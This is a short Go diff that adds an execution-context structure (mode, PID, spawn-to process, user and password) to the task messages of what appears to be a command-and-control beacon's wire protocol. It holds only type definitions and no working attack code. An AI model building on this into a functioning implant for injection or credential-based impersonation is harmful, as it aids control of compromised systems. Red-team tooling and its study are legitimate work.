@@ -65,11 +65,21 @@ type registerResponse struct {
 	JitterPct int    `json:"jitter_pct"`
 }
 
+// execCtxWire carries per-task execution context from the server.
+type execCtxWire struct {
+	Mode    string `json:"mode"`
+	PID     int    `json:"pid,omitempty"`
+	SpawnTo string `json:"spawnto,omitempty"`
+	User    string `json:"user,omitempty"`
+	Pass    string `json:"pass,omitempty"`
+}
+
 type taskWire struct {
-	ID      int64  `json:"id"`
-	Type    string `json:"type"`
-	Args    string `json:"args,omitempty"`
-	Payload string `json:"payload,omitempty"`
+	ID      int64        `json:"id"`
+	Type    string       `json:"type"`
+	Args    string       `json:"args,omitempty"`
+	Payload string       `json:"payload,omitempty"`
+	ExecCtx *execCtxWire `json:"exec_ctx,omitempty"`
 }
 
 type beaconResponse struct {
